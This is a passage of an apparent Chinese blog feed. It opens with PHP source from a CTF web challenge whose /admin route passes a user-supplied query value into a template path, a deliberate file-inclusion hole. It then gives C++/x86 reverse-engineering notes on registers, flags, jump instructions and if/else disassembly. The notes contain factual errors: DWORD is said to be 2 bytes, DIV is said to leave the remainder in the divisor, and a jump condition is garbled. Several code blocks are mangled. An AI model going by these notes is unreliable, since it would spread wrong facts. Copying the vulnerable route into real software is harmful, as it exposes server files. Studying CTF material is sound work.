class="hljs-variable">$app</span>-&gt;redirect(<span class="hljs-string">&quot;/login&quot;</span>);<br>    &#125;<br><br>    <br>&#125;);<br><br><br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&#x27;/admin&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$request</span> = <span class="hljs-variable">$app</span>-&gt;request();<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;admin&quot;</span>,[<span class="hljs-string">&quot;data&quot;</span>=&gt;<span class="hljs-string">&quot;./&quot;</span>.<span class="hljs-variable">$request</span>-&gt;query-&gt;data],<span class="hljs-string">&quot;body_content&quot;</span>);<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;template&quot;</span>,[]);<br>&#125;);<br><br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&quot;GET /login&quot;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$request</span> = <span class="hljs-variable">$app</span>-&gt;request();<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;login&quot;</span>,[<span class="hljs-string">&quot;fail&quot;</span>=&gt;<span class="hljs-variable">$request</span>-&gt;query-&gt;fail],<span class="hljs-string">&quot;body_content&quot;</span>);<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;template&quot;</span>,[]);<br>&#125;);<br><br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&quot;POST /login&quot;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>,<span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$request</span>  = <span class="hljs-variable">$app</span>-&gt;request();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$request</span>-&gt;data-&gt;username === <span class="hljs-variable">$username</span> &amp;&amp; <span class="hljs-variable">$request</span>-&gt;data-&gt;password === <span class="hljs-variable">$password</span>)&#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable">$app</span>-&gt;redirect(<span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-variable">$app</span>-&gt;redirect(<span class="hljs-string">&quot;/login?fail=1&quot;</span>);<br>&#125;);<br><br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&quot;GET /&quot;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;index&quot;</span>,[],<span class="hljs-string">&quot;body_content&quot;</span>);<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;template&quot;</span>,[]);<br>&#125;);<br><br><span class="hljs-variable">$app</span>-&gt;start();<br></code></pre></td></tr></table></figure><p>我就直接暴躁，不懂别人怎么做的了，也许是直接给源码了，我这里是啥也没有</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF" scheme="https://d3n13d.github.io/categories/CTF/"/>
    
    
    <category term="Web" scheme="https://d3n13d.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>C++逆向笔记</title>
    <link href="https://d3n13d.github.io/2022/01/07/C-%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0/"/>
    <id>https://d3n13d.github.io/2022/01/07/C-%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0/</id>
    <published>2022-01-07T08:44:13.000Z</published>
    <updated>2022-01-09T03:43:46.330Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="信息安全-C-逆向"><a href="#信息安全-C-逆向" class="headerlink" title="信息安全-C++逆向"></a>信息安全-C++逆向</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="存储单位"><a href="#存储单位" class="headerlink" title="存储单位"></a>存储单位</h3><p>​    bit     最小单位 0&#x2F;1</p><p>​    Byte  1Byte&#x3D;8bit</p><p>​    DWORD   1DWORD&#x3D;2Byte</p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><h4 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h4><p>​    eax    累加器寄存器，用于进行数学运算。</p><p>​    ebx    基数寄存器</p><p>​    ecx    计数器</p><p>​    edx    数据寄存器</p><p>​    ESI    原地址寄存器</p><p>​    EDI    目的寄存器</p><p>​    EBP    栈底    </p><p>​    ESP    栈顶</p><p>​    EIP    指令寄存器，EIP指向下一个将会被执行的指令。</p><p>寄存器大小都是32位 (四个字节) 。它们可以储存值为从0-FFFFFFFF (无符号)的数据</p><h4 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h4><ol><li>CS -&gt; ‘code segment’(代码段寄存器)：用于存放应用程序代码所在段的段基址(之后会说明)</li><li>DS -&gt; ‘data segment’(数据段寄存器)：用于存放数据段的段基址(以后会说明)</li><li>ES -&gt; ‘extra segment’(附加段寄存器)：用于存放程序使用的附加数据段的基地址</li><li>SS -&gt; ‘stack segment’(栈段寄存器)：用于存放栈段的段基址(以后会说明)</li></ol><h4 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h4><p>ZF、OF、CF</p><p><strong>Z-Flag(零标志)：</strong></p><p>ZF是破解中用得最多的寄存器(通常情况下占了90%)，它可以设成0或者1。若上一个运算结果为0，则其值为1，否则其值为0。(你可能会问为什么‘CMP’可以操作ZF寄存器，这是因为该指令在做比较操作(等于、不等于)，那什么时候结果是0什么时候是1呢？待会再说) </p><p><strong>The O-Flag(溢出标志)：</strong></p><p>OF寄存器在逆向工程中大概占了4%，当上一步操作改变了某寄存器的最高有效位时，OF寄存器会被设置成1。例如：EAX的值为7FFFFFFFF，如果你此时再给EAX加1，OF寄存器就会被设置成1，因为此时EAX寄存器的最高有效位改变了(你可以使用电脑自带计算器将这个16进制转化成2进制看看)。还有当上一步操作产生溢出时(即算术运算超出了有符号数的表示范围)，OF寄存器也会被设置成1。 </p><p><strong>The C-Flag(进位标志)：</strong></p><p>进位寄存器的使用大概占了1%，如果产生了溢出，就会被设置成1。例，假如某寄存器值为FFFFFFFF，再加上1就会产生溢出，你可以用电脑自带的计算器尝试。 </p><h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><p><strong>CALL (调用)</strong></p><p>语法：CALL something</p><p>CALL指令将当前的相对地址(IP)压入栈中，并且调用CALL 后的子程序</p><p>CALL 可以这样使用：</p><figure class="highlight html"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs html">CALL 404000                ;; 最常见: CALL 地址CALL EAX                   ;<br>; CALL 寄存器 - 如果寄存器存的值为404000，那就等同于第一种情况CALL DWORD PTR [EAX]       ;; <br>CALL [EAX]偏移量所指向的地址CALL DWORD PTR [EAX+5]     ;;‘’<br>CALL [EAX+5]偏移量所指向的地址<br></code></pre></td></tr></table></figure><p><strong>CDQ</strong></p><p>语法：CDQ</p><p>CDQ指令第一次出现时通常不好理解。它通常出现在除法前面，作用是将EDX的所有位变成EAX最高位的值，</p><p>比如当EAX&gt;&#x3D;80000000h时，其二进制最高位为1，则EDX被32位全赋值为1，即FFFFFFFF</p><p>若EAX&lt;80000000，则其二进制最高位为0，EDX为00000000。</p><p>然后将EDX：EAX组成新数(64位)：FFFFFFFF 80000000</p><p><strong>DEC (自减)</strong></p><p>语法: DEC something</p><p>dec用来自减1，相当于c中的–</p><p>dec可以有以下使用方式：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">dec eax                             ;; eax自减1dec [eax]                           ;; 偏移量为eax的值自减1dec [401000]                        ;; 偏移量为401000的值自减1dec [eax+401000]                    ;; 偏移量为eax+401000的值自减1<br></code></pre></td></tr></table></figure><p>dec指令可以标记ZF、OF</p><p><strong>DIV (除)</strong></p><p>语法: DIV 除数</p><p>DIV指令用来将EAX除以除数(无符号除法)，被除数通常是EAX，结果也储存在EAX中，而被除数对除数取的模存在除数中。</p><p>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">mov eax,64                      ;<br>; EAX = 64h = 100<br>mov ecx,9                       ;; <br>ECX = 9<br>div ecx                         ;; EAX除以ECX<br></code></pre></td></tr></table></figure><p>在除法之后 EAX &#x3D; 100&#x2F;9 &#x3D; 0B(十进制：11) 并且 ECX &#x3D; 100 MOD 9 &#x3D; 1</p><p>div指令可以标记CF、OF、ZF</p><p><strong>IDIV (整除)</strong></p><p>语法: IDIV 除数</p><p>IDIV执行方式同div一样，不过IDIV是有符号的除法</p><p>idiv指令可以标记CF、OC、ZF</p><p><strong>IMUL (整乘)</strong></p><p>语法：IMUL 数值</p><p>IMUL 目标寄存器、数值、数值</p><p>IMUL 目标寄存器、数值</p><p>IMUL指令可以把让EAX乘上一个数(INUL 数值)或者让两个数值相乘并把乘积放在目标寄存器中(IMUL 目标寄存器, 数值,数值)或者将目标寄存器乘上某数值(IMUL 目标寄存器, 数值)</p><p>如果乘积太大目标寄存器装不下，那OF、CF都会被标记，ZF也会被标记</p><p><strong>JUMPS</strong></p><p>这些都是最重要的跳转指令和触发条件(重要用*标记，最重要用**标记)：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html">指令                条件                    条件<br>JA*          -    如果大于就跳转(无符号)      - CF=0 and ZF=0<br>JAE          -    如果大于或等于就跳转(无符号)- CF=0JB*          -    如果小于就跳转(无符号)   - CF=<br>1JBE          -    如果小于或等于就跳转(无符号)- CF=1 or ZF=1<br>JC           -    如果CF被标记就了跳转       - CF=1JCXZ         -    如果CX等于0就跳转      - CX=0<br>JE**         -    如果相等就跳转        - ZF=1<br>JECXZ        -    如果ECX等于0就跳转       - ECX=0JG*          -    如果大于就跳转(有符号)   - ZF=0 and SF=OF (SF = Sign Flag)<br><br>JL          -    如果小于就跳转(有符号)    - SF != OF (!= is not)<br>JLE         -    如果小于或等于就跳转(有符号 - ZF=1 and OF != OF<br>JMP      -    跳转             - 强制跳转JNA          -    如果不大于就跳转(无符号)   - CF=1 or ZF=1<br>JNAE         -    如果不大于等于就跳转(无符号) - CF=1<br>JNB          -    如果不小于就跳转(无符号)   - CF=0JNBE         -    如果不小于等于就跳转(无符号) - CF=0 and ZF=0JNC          -    如果CF未被标记就跳转     - CF=0JNE**        -    如果不等于就跳转       - ZF=0JNG          -    如果不大于就跳转(有符号)   - ZF=1 or SF!=OF<br>JGE*         -    如果大于或等于就跳转(有符号) - SF=OF<br>JNGE         -    如果不大于等于就跳转(有符号) - SF!=OF<br>JNL          -    如果不小于就跳转(有符号)   - SF=OF<br>JNLE         -    如果不小于等于就跳转(有符号) - ZF=0 and SF=OF<br>JNO          -    如果OF未被标记就跳转     - OF=0<br>JNP          -    如果PF未被标记就跳转     - PF=0<br>JNS          -    如果SF未被标记就跳转      - SF=0<br>JNZ          -    如果不等于0就跳转      - ZF=0JO           -    如果OF被标记就跳转     - OF=1JP           -    如果PF被标记就跳转     - PF=1<br>JPE          -    如果是偶数就跳转       - PF=1JPO          -    如果是奇数就跳转       - PF=0<br>JS           -    如果SF被标记就跳转     - SF=1<br>JZ           -    如果等于0就跳转      - ZF=1<br></code></pre></td></tr></table></figure><p><strong>MUL (乘法)</strong></p><p>语法：MUL 数值</p><p>这个指令同IMUL一样，不过MUL可以乘无符号数。</p><p><strong>REP&#x2F;REPE&#x2F;REPZ&#x2F;REPNE&#x2F;REPNZ</strong></p><p>语法: REP&#x2F;REPE&#x2F;REPZ&#x2F;REPNE&#x2F;REPNZ ins</p><p>重复上面的指令：直到CX&#x3D;0。ins必须是一个操作符，比如CMPS、INS、LODS、MOVS、OUTS、SCAS 或 STOS</p><p><strong>RET (返回)</strong></p><p>语法：RET</p><p>RET digit</p><p>RET指令的功能是从一个代码区域中退出到调用CALL的指令处。</p><p>RET digit在返回前会清理栈</p><p><strong>TEST</strong></p><p>语法：TEST 操作符、操作符</p><p>这个指令99%都是用于”TEST EAX, EAX”，它执行与AND相同的功能，但是并不储存数据。如果EAX&#x3D;0就会标记ZF，如果EAX不是0，就会清空ZF</p><p><strong>XOR</strong></p><p>语法：XOR 目的数,源数</p><p>XOR指令对两个数进行异或操作</p><p>这个指令清空OF、CF，但会标记ZF</p><p>为了更好的理解，思考下面的二进制串：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">1001010110 0101001101<br></code></pre></td></tr></table></figure><p>如果异或它们，结果将是1100011011</p><p>如果两个值相等，则结果为0，否则为1，你可以使用计算器验算。</p><p>很多情况下我们会使用”XOR EAX, EAX”，这个操作是将EAX赋值为0，因为当一个值异或其自身，就过都是0。</p><h2 id="选择结构语句"><a href="#选择结构语句" class="headerlink" title="选择结构语句"></a>选择结构语句</h2><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><h4 id="Only-ifelse"><a href="#Only-ifelse" class="headerlink" title="Only ifelse"></a>Only ifelse</h4><p>特点：</p><p>​    cmp ;条件反写，为了跳过后面的jxx 进而执行代码块内容</p><p>​    if else则都是往增量地址跳转</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nNumber = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%ud&quot;</span>,&amp;nNumber);<br>    <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">0</span>)<br>    &#123;<br>        nNumber = <span class="hljs-number">0</span>;                <span class="hljs-comment">//第一种情况下无分支</span><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        nNumber = <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> nNumber;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应反汇编结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">main proc near</span><br><span class="hljs-function"></span><br><span class="hljs-function">var_4</span>= dword ptr <span class="hljs-number">-4</span><br>arg_0= dword ptr  <span class="hljs-number">10</span>h<br>arg_8= qword ptr  <span class="hljs-number">18</span>h<br><br>push    rbp<br>mov     rbp, rsp  <span class="hljs-comment">//初始化栈</span><br>sub     rsp, <span class="hljs-number">30</span>h   <span class="hljs-comment">//开辟栈</span><br>mov     [rbp+arg_0], ecx <br>mov     [rbp+arg_8], rdx<br>call    __main<br>mov     [rbp+var_4], <span class="hljs-number">0</span>   <span class="hljs-comment">//[rbp-4] =0 val1=0</span><br>lea     rax, [rbp+var_4]  <br>mov     rdx, rax<br>lea     rcx, Format     ; <span class="hljs-string">&quot;%ud&quot;</span><br>call    <span class="hljs-built_in">scanf</span>  <span class="hljs-comment">//scanf读入数据</span><br>cmp     [rbp+arg_0], <span class="hljs-number">0</span>   <span class="hljs-comment">// argc==0</span><br>jnz     <span class="hljs-keyword">short</span> loc_40158D<br>       <span class="hljs-comment">//分支1</span><br>        mov     [rbp+var_4], <span class="hljs-number">0</span>  <br>jmp     <span class="hljs-keyword">short</span> loc_401594<br>       <span class="hljs-comment">//分支2</span><br>        loc_40158D:<br>mov     [rbp+var_4], <span class="hljs-number">0F</span>FFFFFFFh <span class="hljs-comment">// 代码中体现的是变量值=-1 这里为什么是0FFFFFFFF</span><br>     <br></code></pre></td></tr></table></figure><h4 id="onlyifelse1"><a href="#onlyifelse1" class="headerlink" title="onlyifelse1"></a>onlyifelse1</h4><p>特点：</p><p>​    不能调换if和else的位置，因为代码的位置不能变，否则某些依赖代码位置的计算会出错</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nNumber = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%ud&quot;</span>,&amp;nNumber);<br>    <span class="hljs-keyword">if</span>(argc == nNumber)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,nNumber / <span class="hljs-number">8</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,nNumber / <span class="hljs-number">5</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> nNumber;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应反汇编结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c">; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h  <span class="hljs-comment">//对应argc</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h    <span class="hljs-comment">//argv</span><br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main     <span class="hljs-comment">//main函数开始</span><br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_4], <span class="hljs-number">0</span>  ; var_a=<span class="hljs-number">0</span><br>.text:<span class="hljs-number">000000000040156B</span>                 lea     rax, [rbp+var_4]    <br>.text:<span class="hljs-number">000000000040156F</span>                 mov     rdx, rax        ; rdx=<span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401572</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%ud&quot;</span><br>.text:<span class="hljs-number">0000000000401579</span>                 call    <span class="hljs-built_in">scanf</span><br>.text:<span class="hljs-number">000000000040157</span>E                 mov     edx, [rbp+arg_0]  <span class="hljs-comment">//argc</span><br>.text:<span class="hljs-number">0000000000401581</span>                 mov     eax, [rbp+var_4] <span class="hljs-comment">//var_a=0</span><br>.text:<span class="hljs-number">0000000000401584</span>                 cmp     edx, eax  <span class="hljs-comment">//if(argc==var_a)&#123; var_a=var_a/8;printf(&quot;%d&quot;,); &#125;</span><br>.text:<span class="hljs-number">0000000000401586</span>                 jnz     <span class="hljs-keyword">short</span> loc_40159E<br>.text:<span class="hljs-number">0000000000401588</span>                 mov     eax, [rbp+var_4]  <span class="hljs-comment">//eax=0</span><br>.text:<span class="hljs-number">000000000040158B</span>                 shr     eax, <span class="hljs-number">3</span>          ; /<span class="hljs-number">8</span><br>.text:<span class="hljs-number">000000000040158</span>E                 mov     edx, eax  <br>.text:<span class="hljs-number">0000000000401590</span>                 lea     rcx, aD         ; <span class="hljs-string">&quot;%d&quot;</span><br>.text:<span class="hljs-number">0000000000401597</span>                 call    <span class="hljs-built_in">printf</span>   <br>.text:<span class="hljs-number">000000000040159</span>C                 jmp     <span class="hljs-keyword">short</span> loc_4015BB<br>.text:<span class="hljs-number">000000000040159</span>E ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">000000000040159</span>E<br>.text:<span class="hljs-number">000000000040159</span>E loc_40159E:                             ; CODE XREF: main+<span class="hljs-number">36</span>↑j  <span class="hljs-comment">//else </span><br>.text:<span class="hljs-number">000000000040159</span>E                 mov     eax, [rbp+var_4]  <span class="hljs-comment">//eax=var_a</span><br>.text:<span class="hljs-number">00000000004015</span>A1                 mov     edx, <span class="hljs-number">0</span>CCCCCCCDh<br>.text:<span class="hljs-number">00000000004015</span>A6                 mul     edx   <span class="hljs-comment">//eax * 0CCCCCCCDh</span><br>.text:<span class="hljs-number">00000000004015</span>A8                 mov     eax, edx  <span class="hljs-comment">//</span><br>.text:<span class="hljs-number">00000000004015</span>AA                 shr     eax, <span class="hljs-number">2</span>   <span class="hljs-comment">//eax/4</span><br>.text:<span class="hljs-number">00000000004015</span>AD                 mov     edx, eax<br>.text:<span class="hljs-number">00000000004015</span>AF                 lea     rcx, aD         ; <span class="hljs-string">&quot;%d&quot;</span><br>.text:<span class="hljs-number">00000000004015B</span>6                 call    <span class="hljs-built_in">printf</span><br>.text:<span class="hljs-number">00000000004015B</span>B<br>.text:<span class="hljs-number">00000000004015B</span>B loc_4015BB:                             ; CODE XREF: main+<span class="hljs-number">4</span>C↑j<br>.text:<span class="hljs-number">00000000004015B</span>B                 mov     eax, [rbp+var_4]<br>.text:<span class="hljs-number">00000000004015B</span>E                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">00000000004015</span>C2                 pop     rbp<br>.text:<span class="hljs-number">00000000004015</span>C3                 retn<br>.text:<span class="hljs-number">00000000004015</span>C3 main            endp<br></code></pre></td></tr></table></figure><h4 id="ifelseifelse结构"><a href="#ifelseifelse结构" class="headerlink" title="ifelseifelse结构"></a>ifelseifelse结构</h4><p>当每个跳转指令的跳转地址之前都紧跟着 jmp指令，并且他们的跳转地址都一样时，可视为一个 多分支结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nVar_4 = <span class="hljs-number">5</span>;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;nVar_4);<br><br>  <span class="hljs-comment">// argc == 0 ? 0 : -1</span><br>  <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">0</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argc == 0\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">1</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argc == 1\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">2</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argc == 2\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">3</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argc == 3\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span 